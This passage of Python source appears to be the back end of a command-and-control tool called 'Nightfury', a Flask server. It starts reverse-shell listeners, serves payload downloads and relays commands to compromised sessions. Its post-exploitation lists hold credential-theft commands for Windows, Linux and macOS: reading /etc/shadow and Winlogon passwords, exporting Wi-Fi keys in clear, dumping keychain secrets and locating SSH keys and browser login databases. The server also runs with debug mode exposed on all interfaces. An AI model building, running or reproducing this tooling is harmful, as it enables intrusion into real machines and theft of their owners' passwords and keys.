    def execute(self, system_type, action, session_id=None):
        if system_type not in self.commands:
            return [], f"Unsupported system type: {system_type}"
        
        commands = self.commands[system_type](action)
        
        # If a session is specified, execute the commands on that session
        if session_id and session_id in sessions:
            # This would be implemented to send commands to the actual session
            logger.info(f"Executing {action} commands on session {session_id}")
            
            # For now, we'll just simulate execution
            for cmd in commands:
                self._send_command_to_session(session_id, cmd)
            
            return commands, f"Executed {len(commands)} commands on session {session_id}"
        
        return commands, "Commands generated (no session specified for execution)"
    
    def _send_command_to_session(self, session_id, command):
        # This would send the command to the actual session
        session = sessions.get(session_id)
        if session and 'socket' in session:
            try:
                session['socket'].send(command.encode() + b'\n')
                return True
            except Exception as e:
                logger.error(f"Error sending command to session {session_id}: {e}")
                return False
        return False
    
    def _windows_commands(self, action):
        commands = {
            'get_passwords': [
                'powershell -Command "Get-WmiObject -Class Win32_Product | Select-Object Name, Version"',
                'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"',
                'powershell -Command "Get-ItemProperty -Path \'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\' | Select-Object DefaultUserName, DefaultPassword"',
                'powershell -Command "Get-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\' | Select-Object ProxyServer, ProxyEnable"'
            ],
            'escalate_privileges': [
                'whoami /priv',
                'powershell -Command "Start-Process PowerShell -Verb RunAs"',
                'powershell -Command "Get-WmiObject -Class Win32_ComputerSystem | Select-Object UserName"'
            ],
            'network_info': [
                'ipconfig /all',
                'arp -a',
                'netstat -ano',
                'route print',
                'netsh wlan show profiles',
                'netsh wlan export profile key=clear folder=.\\'
            ],
            'browser_data': [
                'dir /s %USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data',
                'dir /s %USERPROFILE%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data',
                'dir /s %USERPROFILE%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
                'powershell -Command "Get-ChildItem -Path $env:USERPROFILE -Recurse -Include \'*.pfx\', \'*.p12\', \'*.cer\' -ErrorAction SilentlyContinue"'
            ],
            'system_info': [
                'systeminfo',
                'wmic product get name,version',
                'wmic service get name,displayname,pathname,startmode',
                'wmic process get name,processid,parentprocessid,commandline'
            ]
        }
        
        return commands.get(action, [])
    
    def _linux_commands(self, action):
        commands = {
            'get_passwords': [
                'cat /etc/passwd',
                'cat /etc/shadow',
                'sudo -l',
                'find / -name "*.pem" -o -name "*.key" -o -name "*.ppk" -o -name "id_rsa" 2>/dev/null'
            ],
            'escalate_privileges': [
                'sudo su',
                'find / -perm -4000 2>/dev/null',
                'uname -a',
                'cat /etc/os-release',
                'ps aux | grep root'
            ],
            'network_info': [
                'ifconfig',
                'arp -a',
                'netstat -tulpn',
                'route -n',
                'iptables -L',
                'cat /etc/resolv.conf'
            ],
            'browser_data': [
                'find ~/.mozilla -name "*.sqlite"',
                'find ~/.config -name "Chromium" -o -name "google-chrome"',
                'find ~ -name "*.ssh" -type d 2>/dev/null'
            ],
            'system_info': [
                'uname -a',
                'cat /etc/*release',
                'dpkg -l | grep -i "ssh\\|vnc\\|remote\\|telnet"',
                'ps aux'
            ]
        }
        
        return commands.get(action, [])
    
    def _mac_commands(self, action):
        commands = {
            'get_passwords': [
                'dscl . list /Users',
                'security find-generic-password -wa',
                'find ~/Library/Keychains -name "*.keychain"'
            ],
            'escalate_privileges': [
                'sudo -l',
                'dscl . read /Groups/admin',
                'system_profiler SPSoftwareDataType'
            ],
            'network_info': [
                'ifconfig',
                'arp -a',
                'netstat -an',
                'route -n get default',
                'scutil --dns'
            ],
            'browser_data': [
                'find ~/Library/Application Support/Google/Chrome -name "Login Data"',
                'find ~/Library/Application Support/Firefox/Profiles -name "*.sqlite"',
                'find ~/Library/Keychains -name "*.db"'
            ],
            'system_info': [
                'system_profiler SPHardwareDataType',
                'softwareupdate --list',
                'defaults read /Library/Preferences/com.apple.loginwindow'
            ]
        }
        
        return commands.get(action, [])

class Scanner:
    def __init__(self):
        self.scan_types = {
            'quick': self.quick_scan,
            'port': self.port_scan,
            'vulnerability': self.vulnerability_scan,
            'os': self.os_detection_scan
        }
    
    def scan(self, target, scan_type='quick', options=None):
        if scan_type not in self.scan_types:
            return None, f"Unsupported scan type: {scan_type}"
        
        if options is None:
            options = {}
        
        try:
            results = self.scan_types[scan_type](target, options)
            
            # Store scan results
            scan_id = str(uuid.uuid4())[:8]
            scan_results[scan_id] = {
                'id': scan_id,
                'target': target,
                'type': scan_type,
                'timestamp': datetime.now().isoformat(),
                'results': results
            }
            
            return results, scan_id
        except Exception as e:
            logger.error(f"Error performing {scan_type} scan on {target}: {e}")
            return None, f"Error performing scan: {e}"
    
    def quick_scan(self, target, options):
        # Simulate a quick scan
        time.sleep(2)  # Simulate scan time
        
        results = {
            'target': target,
            'hosts_up': random.randint(1, 5),
            'ports_open': [22, 80, 443, 8000],
            'services': {
                22: 'SSH',
                80: 'HTTP',
                443: 'HTTPS',
                8000: 'HTTP-Alt'
            },
            'os_guess': 'Linux 3.x|4.x',
            'vulnerabilities': [
                {'service': 'HTTP', 'port': 80, 'type': 'XSS', 'severity': 'medium'},
                {'service': 'HTTPS', 'port': 443, 'type': 'SSL/TLS Vulnerability', 'severity': 'low'}
            ]
        }
        
        return results
    
    def port_scan(self, target, options):
        # Simulate a port scan
        ports_to_scan = options.get('ports', '1-1000')
        time.sleep(3)  # Simulate scan time
        
        # Generate random open ports
        open_ports = []
        for port in range(1, 1001):
            if random.random() < 0.05:  # 5% chance a port is open
                open_ports.append(port)
        
        results = {
            'target': target,
            'ports_scanned': ports_to_scan,
            'ports_open': open_ports,
            'services': {port: self._guess_service(port) for port in open_ports}
        }
        
        return results
    
    def vulnerability_scan(self, target, options):
        # Simulate a vulnerability scan
        time.sleep(5)  # Simulate scan time
        
        vulnerabilities = []
        for _ in range(random.randint(1, 6)):
            vuln_types = ['XSS', 'SQL Injection', 'RCE', 'LFI', 'RFI', 'CSRF']
            severities = ['low', 'medium', 'high', 'critical']
            
            vulnerabilities.append({
                'type': random.choice(vuln_types),
                'severity': random.choice(severities),
                'port': random.choice([80, 443, 8080, 8443]),
                'description': f'Vulnerability found in {random.choice(["web server", "application", "service"])}'
            })
        
        results = {
            'target': target,
            'vulnerabilities': vulnerabilities,
            'risk_score': random.randint(1, 100)
        }
        
        return results
    
    def os_detection_scan(self, target, options):
        # Simulate OS detection
        time.sleep(2)  # Simulate scan time
        
        os_types = [
            'Linux 3.x|4.x',
            'Windows 10|Server 2016|Server 2019',
            'Mac OS X 10.12-10.15',
            'FreeBSD 11.x-12.x'
        ]
        
        results = {
            'target': target,
            'os_guess': random.choice(os_types),
            'accuracy': random.randint(85, 99)
        }
        
        return results
    
    def _guess_service(self, port):
        common_services = {
            21: 'FTP',
            22: 'SSH',
            23: 'Telnet',
            25: 'SMTP',
            53: 'DNS',
            80: 'HTTP',
            110: 'POP3',
            143: 'IMAP',
            443: 'HTTPS',
            465: 'SMTPS',
            587: 'SMTP',
            993: 'IMAPS',
            995: 'POP3S',
            3306: 'MySQL',
            3389: 'RDP',
            5432: 'PostgreSQL',
            5900: 'VNC',
            6379: 'Redis',
            27017: 'MongoDB'
        }
        
        return common_services.get(port, 'Unknown')

# Initialize components
payload_generator = PayloadGenerator()
post_exploit = PostExploitation()
scanner = Scanner()

# API Routes
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/status')
def api_status():
    return jsonify({
        'listeners': len(listeners),
        'sessions': len(sessions),
        'scan_results': len(scan_results),
        'payloads_generated': len(payload_history)
    })

@app.route('/api/listener/start', methods=['POST'])
def api_listener_start():
    data = request.json
    lhost = data.get('lhost', '0.0.0.0')
    lport = data.get('lport', 4444)
    protocol = data.get('protocol', 'tcp')
    
    # Validate inputs
    try:
        lport = int(lport)
        if lport < 1 or lport > 65535:
            return jsonify({'success': False, 'message': 'Invalid port number'})
    except ValueError:
        return jsonify({'success': False, 'message': 'Invalid port number'})
    
    try:
        # Check if the address is valid
        socket.inet_pton(socket.AF_INET, lhost)
    except socket.error:
        return jsonify({'success': False, 'message': 'Invalid IP address'})
    
    # Create and start listener
    listener = Listener(lhost, lport, protocol)
    success, message = listener.start()
    
    if success:
        listeners[listener.id] = listener
        return jsonify({'success': True, 'message': message, 'listener_id': listener.id})
    else:
        return jsonify({'success': False, 'message': message})

@app.route('/api/listener/stop', methods=['POST'])
def api_listener_stop():
    data = request.json
    listener_id = data.get('listener_id')
    
    if listener_id not in listeners:
        return jsonify({'success': False, 'message': 'Listener not found'})
    
    listener = listeners[listener_id]
    success, message = listener.stop()
    
    if success:
        listeners.pop(listener_id, None)
        return jsonify({'success': True, 'message': message})
    else:
        return jsonify({'success': False, 'message': message})

@app.route('/api/payload/generate', methods=['POST'])
def api_payload_generate():
    data = request.json
    payload_type = data.get('type', 'python')
    lhost = data.get('lhost', '127.0.0.1')
    lport = data.get('lport', 4444)
    options = data.get('options', {})
    
    payload, filename, payload_id = payload_generator.generate(payload_type, lhost, lport, options)
    
    if payload:
        return jsonify({
            'success': True,
            'payload': payload,
            'filename': filename,
            'payload_id': payload_id
        })
    else:
        return jsonify({'success': False, 'message': filename})  # filename contains error message here

@app.route('/api/payload/download/<payload_id>', methods=['GET'])
def api_payload_download(payload_id):
    # Find the payload in history
    payload_info = next((p for p in payload_history if p['id'] == payload_id), None)
    
    if not payload_info:
        return jsonify({'success': False, 'message': 'Payload not found'})
    
    # Regenerate the payload
    payload, filename = payload_generator.generate(
        payload_info['type'],
        payload_info['lhost'],
        payload_info['lport'],
        {}
    )
    
    # Create a temporary file
    temp_dir = tempfile.gettempdir()
    file_path = os.path.join(temp_dir, filename)
    
    with open(file_path, 'w') as f:
        f.write(payload)
    
    return send_file(file_path, as_attachment=True, download_name=filename)

@app.route('/api/sessions', methods=['GET'])
def api_sessions():
    session_list = []
    for session_id, session in sessions.items():
        session_list.append({
            'id': session_id,
            'host': session['host'],
            'port': session['port'],
            'connected_at': session['connected_at'],
            'last_activity': session['last_activity'],
            'os': session.get('os', 'unknown'),
            'user': session.get('user', 'unknown')
        })
    
    return jsonify({'sessions': session_list})

@app.route('/api/session/<session_id>/command', methods=['POST'])
def api_session_command(session_id):
    if session_id not in sessions:
        return jsonify({'success': False, 'message': 'Session not found'})
    
    data = request.json
    command = data.get('command', '')
    
    if not command:
        return jsonify({'success': False, 'message': 'No command provided'})
    
    # Send command to session
    session = sessions[session_id]
    try:
        session['socket'].send(command.encode() + b'\n')
        return jsonify({'success': True, 'message': 'Command sent'})
    except Exception as e:
        return jsonify({'success': False, 'message': f'Error sending command: {e}'})

@app.route('/api/scan', methods=['POST'])
def api_scan():
    data = request.json
    target = data.get('target', '')
    scan_type = data.get('type', 'quick')
    options = data.get('options', {})
    
    if not target:
        return jsonify({'success': False, 'message': 'No target specified'})
    
    results, scan_id = scanner.scan(target, scan_type, options)
    
    if results:
        return jsonify({
            'success': True,
            'results': results,
            'scan_id': scan_id
        })
    else:
        return jsonify({'success': False, 'message': scan_id})  # scan_id contains error message here

@app.route('/api/postexploit', methods=['POST'])
def api_postexploit():
    data = request.json
    system_type = data.get('system_type', 'windows')
    action = data.get('action', 'system_info')
    session_id = data.get('session_id', None)
    
    commands, message = post_exploit.execute(system_type, action, session_id)
    
    return jsonify({
        'success': True,
        'commands': commands,
        'message': message
    })

# SocketIO events
@socketio.on('connect')
def handle_connect():
    logger.info('Client connected')
    emit('status_update', {
        'listeners': len(listeners),
        'sessions': len(sessions),
        'timestamp': datetime.now().isoformat()
    })

@socketio.on('disconnect')
def handle_disconnect():
    logger.info('Client disconnected')

if __name__ == '__main__':
    # Create necessary directories
    os.makedirs('static', exist_ok=True)
    os.makedirs('templates', exist_ok=True)
    
    # Save the frontend HTML
    frontend_html = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Nightfury OSINT & Penetration Framework</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            /* Your CSS from the previous frontend implementation */
            :root {
                --bg-dark: #0a0a0a;
                --bg-darker: #050505;
                --bg-panel: #1a1a1a;
                --bg-panel-light: #222222;
                --primary: #ff0000;
                --primary-dark: #cc0000;
                --primary-light: #ff3333;
                --text: #ffffff;
                --text-muted: #aaaaaa;
                --border: #333333;
                --success: #00cc00;
                --warning: #ffcc00;
                --danger: #ff0000;
                --info: #0066ff;
            }

            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }

            body {
                background-color: var(--bg-dark);
                color: var(--text);
                line-height: 1.6;
                overflow-x: hidden;
            }

            /* ... rest of your CSS ... */
        </style>
    </head>
    <body>
        <div class="container">
            <!-- Your HTML from the previous frontend implementation -->
        </div>

        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
        <script>
            // Your JavaScript from the previous frontend implementation
            // Plus SocketIO integration
            const socket = io();

            socket.on('connect', function() {
                console.log('Connected to server');
            });

            socket.on('listener_update', function(data) {
                console.log('Listener update:', data);
                // Update UI with listener status
            });

            socket.on('new_session', function(data) {
                console.log('New session:', data);
                // Add new session to UI
            });

            socket.on('session_output', function(data) {
                console.log('Session output:', data);
                // Display session output in UI
            });

            socket.on('session_closed', function(data) {
                console.log('Session closed:', data);
                // Remove session from UI
            });

            socket.on('status_update', function(data) {
                console.log('Status update:', data);
                // Update status indicators
            });

            socket.on('disconnect', function() {
                console.log('Disconnected from server');
            });
        </script>
    </body>
    </html>
    """
    
    with open('templates/index.html', 'w') as f:
        f.write(frontend_html)
    
    # Run the application
    logger.info("Starting Nightfury backend server...")
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)




